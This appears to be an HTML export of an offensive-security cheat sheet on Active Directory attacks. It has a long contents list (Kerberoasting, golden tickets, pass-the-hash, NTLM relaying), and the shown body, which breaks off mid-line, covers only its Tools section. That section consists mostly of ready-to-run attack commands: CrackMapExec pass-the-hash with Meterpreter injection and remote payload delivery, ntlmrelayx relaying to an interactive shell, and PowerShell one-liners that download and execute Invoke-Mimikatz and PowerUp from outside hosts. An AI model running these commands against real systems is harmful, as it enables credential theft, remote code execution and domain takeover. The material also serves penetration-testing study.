<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Active Directory Attacks</title><style>
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark-href {
	font-size: 0.75em;
	opacity: 0.5;
}

.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, KaiTi, STKaiTi, 'ÂçéÊñáÊ•∑‰Ωì', KaiTi_GB2312, 'Ê•∑‰Ωì_GB2312', serif; }
.mono { font-family: Nitti, 'Microsoft YaHei', 'ÂæÆËΩØÈõÖÈªë', monospace; }
.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .code { font-family: Source Code Pro, 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, KaiTi, STKaiTi, 'ÂçéÊñáÊ•∑‰Ωì', KaiTi_GB2312, 'Ê•∑‰Ωì_GB2312', serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .mono { font-family: PT Mono, Nitti, 'Microsoft YaHei', 'ÂæÆËΩØÈõÖÈªë', monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.highlight-default {
}
.highlight-gray {
	color: rgb(155,154,151);
}
.highlight-brown {
	color: rgb(100,71,58);
}
.highlight-orange {
	color: rgb(217,115,13);
}
.highlight-yellow {
	color: rgb(223,171,1);
}
.highlight-teal {
	color: rgb(15,123,108);
}
.highlight-blue {
	color: rgb(11,110,153);
}
.highlight-purple {
	color: rgb(105,64,165);
}
.highlight-pink {
	color: rgb(173,26,114);
}
.highlight-red {
	color: rgb(224,62,62);
}
.highlight-gray_background {
	background: rgb(235,236,237);
}
.highlight-brown_background {
	background: rgb(233,229,227);
}
.highlight-orange_background {
	background: rgb(250,235,221);
}
.highlight-yellow_background {
	background: rgb(251,243,219);
}
.highlight-teal_background {
	background: rgb(221,237,234);
}
.highlight-blue_background {
	background: rgb(221,235,241);
}
.highlight-purple_background {
	background: rgb(234,228,242);
}
.highlight-pink_background {
	background: rgb(244,223,235);
}
.highlight-red_background {
	background: rgb(251,228,228);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(55, 53, 47, 0.6);
	fill: rgba(55, 53, 47, 0.6);
}
.block-color-brown {
	color: rgb(100,71,58);
	fill: rgb(100,71,58);
}
.block-color-orange {
	color: rgb(217,115,13);
	fill: rgb(217,115,13);
}
.block-color-yellow {
	color: rgb(223,171,1);
	fill: rgb(223,171,1);
}
.block-color-teal {
	color: rgb(15,123,108);
	fill: rgb(15,123,108);
}
.block-color-blue {
	color: rgb(11,110,153);
	fill: rgb(11,110,153);
}
.block-color-purple {
	color: rgb(105,64,165);
	fill: rgb(105,64,165);
}
.block-color-pink {
	color: rgb(173,26,114);
	fill: rgb(173,26,114);
}
.block-color-red {
	color: rgb(224,62,62);
	fill: rgb(224,62,62);
}
.block-color-gray_background {
	background: rgb(235,236,237);
}
.block-color-brown_background {
	background: rgb(233,229,227);
}
.block-color-orange_background {
	background: rgb(250,235,221);
}
.block-color-yellow_background {
	background: rgb(251,243,219);
}
.block-color-teal_background {
	background: rgb(221,237,234);
}
.block-color-blue_background {
	background: rgb(221,235,241);
}
.block-color-purple_background {
	background: rgb(234,228,242);
}
.block-color-pink_background {
	background: rgb(244,223,235);
}
.block-color-red_background {
	background: rgb(251,228,228);
}

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="bfa6688c-0ad1-488f-9892-067538d564ce" class="page sans"><header><h1 class="page-title">Active Directory Attacks</h1></header><div class="page-body"><hr id="1caa3555-19bc-44a1-b9af-e8ee0ecc88fb"/><h1 id="36c393e4-6310-4ccb-90cb-f85818c0ac38" class="">Summary</h1><nav id="50115234-3432-446b-9742-64ab75665117" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#36c393e4-6310-4ccb-90cb-f85818c0ac38">Summary</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#58dce608-1084-4e18-8104-0db0ae9eb71d">Tools</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#09f62876-8e87-4179-8c53-6202cc32cc9a">Most common paths to AD compromise</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f427e806-1362-4705-88f0-47805bba8b32">MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#35a5c65d-9cd0-4bf5-a624-743833901b3f">Mitigations</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#18930913-1a6a-4daf-87ab-42a3c1e7f989">Open Shares</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#37bf9aa9-e68d-49d1-902b-565f43f0da44">SCF and URL file attack against writeable share</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#afb17c48-43c5-4ce4-96b7-4bfaf4e3a920">Passwords in SYSVOL &amp; Group Policy Preferences</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c1b3796a-409a-41b6-9381-9e0ea900d846">Automate the SYSVOL and passwords research</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f925b181-ec0e-4832-ae67-83c24408e911">Mitigations</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#1f558109-635d-42e3-bf3a-40737d13d426">Exploit Group Policy Objects GPO</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cdfeb601-c689-4a3a-8c61-297aa2526578">Dumping AD Domain Credentials</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c4b2527e-391c-4423-88f1-1add1203a456">Using ndtsutil</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#62651bea-5a25-4d36-bc85-a49fb5c1c35b">Using Vshadow</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#62190daa-51ea-447d-bc56-34aa67c81884">Using vssadmin</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d95683d8-ba03-4e2d-84e4-b9a732ef2d39">Using DiskShadow (a Windows signed binary)</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#3059f371-2fe0-4a8b-a6b8-7e73ac28a62b">Using esentutl.exe</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#6f808143-896c-4220-a9fa-e530bcac65f0">Extract hashes from ntds.dit</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#2f520718-c5d5-4a38-9e00-c55cef8e12c9">Alternatives - modules</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#fa24d108-2ebc-4a23-a64e-a9278d321cf9">Using Mimikatz DCSync</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#bc669745-c7e4-42b0-a6c9-96f640bb83fd">Using Mimikatz sekurlsa</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f0a3f616-fe8b-4471-8a49-709cd4044139">Password spraying</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#fbe4435f-44eb-4930-8199-4247cdf7d08a">Kerberos pre-auth bruteforcing</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#6684e504-b48e-4303-8cb6-e7b5f719184a">Spray a pre-generated passwords list</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#698494a9-9013-4743-ac92-a9afb6cae7b2">Spray passwords against the RDP service</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f415a9b0-8fee-4748-ba27-9e04ed5bb284">Password in AD User comment</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ae8e48f0-184e-45e9-a824-df7360a0b568">Pass-the-Ticket Golden Tickets</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#9d018f82-4fc6-4e76-83d5-743a852dd4b1">Using Mimikatz</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#4a69477d-3a11-4b8b-924a-c16052aaa61d">Using Meterpreter</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#64785234-f66a-4259-b7f2-03e5411b13e2">Using a ticket on Linux</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c01b9937-37a3-47b7-8e3a-a137d741c4f2">Pass-the-Ticket Silver Tickets</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#a157ca5b-5207-4b06-89cb-65acbfd4e855">Kerberoasting</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#209d425e-87db-402e-85d8-b2a4d80edaf7">KRB_AS_REP Roasting</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#9d8e6648-98f0-4b7d-8c7a-0cb93decf56b">Pass-the-Hash</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#11c5e6ca-59fc-428d-af5e-20d97e786ff6">OverPass-the-Hash (pass the key)</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#2e778f3a-e027-4da5-a70b-a686faa8b183">Using impacket</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b79ae3ae-c41b-4d69-bb2a-f612554dd411">Using Rubeus</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#892cdcf1-3910-4a75-8c17-e7275689d2a0">Capturing and cracking NTLMv2 hashes</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#8202f9d8-307c-4bf2-9726-09cb5c9f422c">NTLMv2 hashes relaying</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#6065ec8b-8d1d-443e-ab62-1e53522ab6a7">MS08-068 NTLM reflection</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b6231bae-66f9-459e-b020-f3c5c7dea298">SMB Signing Disabled and IPv4</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e9a9d290-fe71-4614-9bc2-1c312001adbb">SMB Signing Disabled and IPv6</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#5c6920e3-35b5-48c7-804a-024f2bc71bad">Drop the MIC</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#911bdb02-45b6-400b-a8ea-2ef3ef35fa81">Ghost Potato - CVE-2019-1384</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f6963122-41a4-4dd1-b55a-b6d9c3b4e98f">Dangerous Built-in Groups Usage</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cc570582-de50-44f9-a565-97c10f42983c">AdminSDHolder Abuse</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#7f7bfa0b-3f9e-4df0-a15b-b58b88e7fe9d">Abusing Active Directory ACLs/ACEs</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#1084c0a2-52e2-4793-aad4-1592e9ea1f46">Trust relationship between domains</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d4db6338-d1ff-45af-9fdd-c8c6bac342db">Enumerate trusts between domains</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#0d7bd671-a7d5-451a-85d8-dcbc0cb59aca">Exploit trusts between domains</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#12ed92f5-9427-4e43-801e-5d79ca1c4644">Child Domain to Forest Compromise - SID Hijacking</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b26db0c2-de5e-40f7-a251-ce7c229e4cf3">Kerberos Unconstrained Delegation</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#32731b29-ee24-417d-bd81-f40ffda298d7">Find delegation</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cc1d18e0-cdb7-4f75-a64a-7eec83ff2a93">Monitor with Rubeus</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#2c7de729-8144-47d6-9fd9-076477c6e6d5">Force a connect back from the DC</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#a3a54513-337d-49a4-a335-06058c043d62">Load the ticket</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#093dde24-1e90-4edd-a3ef-cbd26fd5a9bd">Mitigation</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#0f86527f-413a-4d4f-9448-73a5e543b784">Kerberos Resource Based Constrained Delegation</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b6b73f64-62f4-4ca0-b7cd-2462ede43863">Relay delegation with mitm6</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#15278e2c-9b03-49e2-a824-c076642121c0">PrivExchange attack</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d0cfdbd4-68ce-41da-b352-c40465886cb0">PXE Boot image attack</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#8ad78314-2e86-4047-b0cb-679bfb2eac32">Impersonating Office 365 Users on Azure AD Connect</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#0fdf9222-a963-4807-bb63-ac7bcb3f9600">Linux Active Directory</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e4057303-e875-4567-adaf-d34bfc2cbdaf">CCACHE ticket reuse from /tmp</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#a35f1059-6569-48a2-b8cb-50278a03b746">CCACHE ticket reuse from keyring</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f0a362a0-6ff1-4dac-bf4b-edd8602368cc">CCACHE ticket reuse from keytab</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#77a6fa8a-72e0-4c44-8f54-7eadd79e7c3c">Extract accounts from /etc/krb5.keytab</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#3f071cd2-aa4a-4c8c-b25e-55e4a858431a">References</a></div></nav><h2 id="58dce608-1084-4e18-8104-0db0ae9eb71d" class="">Tools</h2><ul id="ea45864d-d9c9-427a-8d25-9d345c56b3b2" class="bulleted-list"><li><a href="https://github.com/CoreSecurity/impacket">Impacket</a> or the <a href="https://github.com/maaaaz/impacket-examples-windows">Windows version</a></li></ul><ul id="383dce5c-f6a4-4bb6-afa1-3b1a5b9659c0" class="bulleted-list"><li><a href="https://github.com/SpiderLabs/Responder">Responder</a></li></ul><ul id="5c95fb93-98e2-44cd-bcb7-28d61e7a98b4" class="bulleted-list"><li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li></ul><ul id="36e9b264-618c-41be-9de9-d6bf3a8beb85" class="bulleted-list"><li><a href="https://github.com/funkandwagnalls/ranger">Ranger</a></li></ul><ul id="0c792fb3-32b1-4384-bf14-c82811608ab4" class="bulleted-list"><li><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a><pre id="56956075-2df7-476a-b76e-a90e6c4bde79" class="code"><code>apt install bloodhound #kali
neo4j console
Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
./bloodhound
SharpHound.exe (from resources/Ingestor)
SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
SharpHound.exe -c all -d active.htb -SearchForest
SharpHound.exe --EncryptZip --ZipFilename export.zip
or 
Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
or 
bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all</code></pre></li></ul><ul id="e654c8be-bc79-4b51-a663-b1648552e0cd" class="bulleted-list"><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">AdExplorer</a></li></ul><ul id="55ae5941-e60c-40e6-86f5-be63943c19a7" class="bulleted-list"><li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a><pre id="c5f62ca1-db89-4fcd-be89-5f2a0c89e3cd" class="code"><code>apt-get install -y libssl-dev libffi-dev python-dev build-essential
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
crackmapexec smb -L
crackmapexec smb -M name_module -o VAR=DATA
crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
crackmapexec 192.168.1.100 -u Administrator -H &#x27;:5858d47a41e40b40f294b3100bea611f&#x27; -d &#x27;DOMAIN&#x27; -M invoke_sessiongopher
crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
crackmapexec 192.168.1.100 -u Administrator -H &quot;:5858d47a41e40b40f294b3100bea611f&quot; -M web_delivery -o URL=&quot;https://IP:PORT/posh-payload&quot;
crackmapexec 192.168.1.100 -u Administrator -H &quot;:5858d47a41e40b40f294b3100bea611f&quot; --exec-method smbexec -X &#x27;whoami&#x27;
crackmapexec smb 10.10.14.0/24 -u user -p &#x27;Password&#x27; --local-auth -M mimikatz
crackmapexec mimikatz --server http --server-port 80</code></pre></li></ul><ul id="f743e8d2-3cac-4db6-ae0e-803e5e775b55" class="bulleted-list"><li><a href="https://github.com/fox-it/mitm6.git">Mitm6</a><pre id="8cc3ba05-e71e-4551-a7bc-e0940e28554d" class="code"><code>git clone https://github.com/fox-it/mitm6.git &amp;&amp; cd mitm6
pip install .
mitm6 -d lab.local
ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
# -wh: Server hosting WPAD file (Attacker‚Äôs IP)
# -t: Target (You cannot relay credentials to the same device that you‚Äôre spoofing)
# -i: open an interactive shell
ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access</code></pre></li></ul><ul id="c5a2425e-0c16-41da-b664-a3d2b2c754df" class="bulleted-list"><li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerSploit</a><pre id="036c88a1-6f7e-4703-8daf-82b40f372c58" class="code"><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.11.0.47/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;
powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.10.10/Invoke-Mimikatz.ps1&#x27;);&quot;</code></pre></li></ul><ul id="048e571c-eace-4b1f-b25b-382d968b0370" class="bulleted-list"><li><a href="https://github.com/sense-of-security/ADRecon">ADRecon</a><pre id="ab8032a1-9b87-4f5a-95d7-da25968a3662" class="code"><code>.\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser</code></pre></li></ul><ul id="e814d0af-b5bb-41b7-a0c0-81f09dca6699" class="bulleted-list"><li><a href="https://github.com/hausec/ADAPE-Script">Active Directory Assessment and Privilege Escalation Script</a><pre id="0aaf0c55-9d97-4529-b565-fd65093ad251" class="code"><code>powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1</code></pre><p id="dd791d2b-736e-4985-895b-ffcd07f4c6e3" class="">
</p></li></ul><ul id="11f3004b-34ab-4bf3-8a31-34e12cd8c734" class="bulleted-list"><li><a href="https://github.com/vletoux/pingcastle">Ping Castle</a><pre id="405be4b9-d9c0-4dcf-bebc-d5c5f2c73a18" class="code"><code>pingcastle.exe --healthcheck --server &lt;DOMAIN_CONTROLLER_IP&gt; --user &lt;USERNAME&gt; --password &lt;PASSWORD&gt; --advanced-live --nullsession
pingcastle.exe --healthcheck --server domain.local
pingcastle.exe --graph --server domain.local
pingcastle.exe --scanner scanner_name --server domain.local
available scanners are:aclcheck,antivirus,corruptADDatabase,foreignusers,laps_bitlocker,localadmin,ullsession,nullsession-trust,share,smb,spooler,startup</code></pre></li></ul><ul id="8e39dab9-2cb0-4240-b826-a0aa03e40f96" class="bulleted-list"><li><a href="https://github.com/ropnop/kerbrute">Kerbrute</a><pre id="dd03346f-7cf3-4578-8804-67a9dab3971b" class="code"><code>./kerbrute passwordspray -d &lt;DOMAIN&gt; &lt;USERS.TXT&gt; &lt;PASSWORD&gt;</code></pre><p id="e99bb752-5715-4587-9506-6c0739102ae2" class="">
</p></li></ul><ul id="0a9b4c0f-d590-4dbd-88f5-3a493af7b748" class="bulleted-list"><li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a><pre id="605a964a-1798-4959-b4a8-e477a1f4f858" class="code"><code>Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
Rubeus.exe klist [/luid:LOGINID]
Rubeus.exe kerberoast [/spn:&quot;blah/blah&quot;] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:&quot;OU=,...&quot;]</code></pre></li></ul><ul id="fc2327eb-cf33-4631-a186-47b165071930" class="bulleted-list"><li><a href="https://github.com/AutomatedLab/AutomatedLab">AutomatedLab</a><pre id="ea89b2e0-63d7-4f0a-874e-22d985757ec6" class="code"><code>New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV
